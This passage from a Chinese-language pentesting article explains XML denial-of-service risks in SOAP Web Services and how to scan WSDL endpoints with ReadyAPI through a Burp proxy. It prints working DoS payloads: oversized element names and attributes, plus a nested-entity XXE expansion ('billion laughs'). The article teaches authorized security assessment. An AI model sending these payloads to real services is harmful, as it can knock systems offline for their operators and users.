<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094243-5baad59c-c16c-1.png"/></p>
<h3 data-content="1" id="f5d0b86fdc22fcca0bf794f86eee3bfd">拒绝服务攻击</h3>
<p>Web Service服务的交互很多都是用的XML格式数据，请求中的XML数据会由服务端的XML解析器进行解析和处理，目前主要有两类XML解析器</p>
<ul>
<li>基于SAX(Simple API for XML)的XML解析器：内存中最多容纳2个元素，在这种情况下基于SAX的解析器不会存在DoS问题</li>
<li>基于DOM(Document Object Model)的XML解析器：会一次性读取客户端存储的所有XML数据，因此会导致内存中存在庞大的对象数据从而导致存在DoS问题，漏洞根源在于没有检查XML中节点的大小和数量</li>
</ul>
<p>针对元素名称的DoS攻击的示例：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;soapenv:Header/&gt;</span>
    <span class="nt">&lt;soapenv:Body&gt;</span>
    <span class="nt">&lt;TEST&gt;</span>
        <span class="nt">&lt;BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA</span><span class="err">………BGABGABGABGABGABGABGABGABGABGA</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/TEST&gt;</span>
    <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p>针对元素属性的DoS攻击的示例：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;soapenv:Header/&gt;</span>
    <span class="nt">&lt;soapenv:Body&gt;</span>
    <span class="nt">&lt;TEST&gt;</span>
        <span class="nt">&lt;BGA</span> <span class="na">attribute=</span><span class="s">"BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA………BGABGABGABGABGABGABGABGABGABGA"</span><span class="nt">&gt;&lt;/BGA&gt;</span>
    <span class="nt">&lt;/TEST&gt;</span>
    <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p>针对元素个数的DoS攻击的示例(也可以通过重复某个特定元素达到同样效果)：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:soapenv=</span><span class="s">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;soapenv:Header/&gt;</span>
        <span class="nt">&lt;soapenv:Body&gt;</span>
        <span class="nt">&lt;TEST&gt;</span>
            <span class="nt">&lt;BGA</span> <span class="na">attribute1=</span><span class="s">"BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA"</span> <span class="na">attribute2=</span><span class="s">"BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA"</span> <span class="na">attribute3=</span><span class="s">"BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA"</span><span class="nt">&gt;&lt;/BGA&gt;</span>
        <span class="nt">&lt;/TEST&gt;</span>
    <span class="nt">&lt;/soapenv:Body&gt;</span>
<span class="nt">&lt;/soapenv:Envelope&gt;</span>
</pre></div>
<p>当然存在XXE时就可以进行XXE DoS攻击：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE bga [</span>
<span class="cp">    &lt;!ELEMENT ANY &gt;</span>
    <span class="cp">&lt;!ENTITY bga1 "bga1"&gt;</span>
    <span class="cp">&lt;!ENTITY bga2 "&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;"&gt;</span>
    <span class="cp">&lt;!ENTITY bga3 "&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;"&gt;</span>
    <span class="cp">&lt;!ENTITY bga4 "&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;"&gt;</span>
    <span class="cp">&lt;!ENTITY bga5 "&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;"&gt;</span>
    <span class="cp">&lt;!ENTITY bga6 "&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;"&gt;</span>
   ]&gt;
<span class="nt">&lt;bga&gt;</span><span class="ni">&amp;bga6;</span><span class="nt">&lt;/bga&gt;</span>
</pre></div>
<h2 data-content="1" id="64cef6dc681da7be0aa0a0640d0002cd">漏洞扫描</h2>
<p>很多人可能会说这里的接口有没有可以进行一次性扫描检测的方法呢？当然有，作为甲方安全人员或者授权的安全评估人员我们可以借助ReadyAPI(<a href="https://www.soapui.org/" target="_blank">https://www.soapui.org/</a> )进行快速的安全扫描测试评估，这里对步骤进行简单介绍，更加细节的部分可以自行进行深入，工具部分不多做演示介绍</p>
<p>Step 1：为了进一步观察这里的测试时怎么进行的，我们第一步先设置Burp代理，在File-&gt;Preferences-&gt;Proxy中设置Burp代理服务器地址<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094430-9bc14666-c16c-1.png"/><br/>
Step 2：新建安全测试任务，选择WSDL相关的API模块定义</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094440-a1beb1de-c16c-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094446-a4f530bc-c16c-1.png"/></p>
<p>Step 3：随后输入WSDL文件的路径</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094456-aaff2f26-c16c-1.png"/></p>
<p>Step 4：WSDL解析完成后会自动生成一系列的安全测试用例，默认都选上安全测试用例，点击Finish，然后运行测试用例<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094509-b2999c9e-c16c-1.png"/></p>
<p>Step 5：随后直接运行即可<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094517-b76be90c-c16c-1.png"/></p>
<p>Step 6：运行完成之后可以查看对应的报告<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202094554-cd8854d2-c16c-1.png"/></p>
<h2 data-content="1" id="e4ef08be0c7fdd6670938752d242d8af">文末小结</h2>
<p>本篇文章主要介绍了WebService的基础知识、工作原理、简易分类、关键要素和安全漏洞，同时对WebService的渗透测试扫描进行了一个大致的普及，最后对目标WebService服务的检索方法进行了简易的概括~</p>
</div>
</div>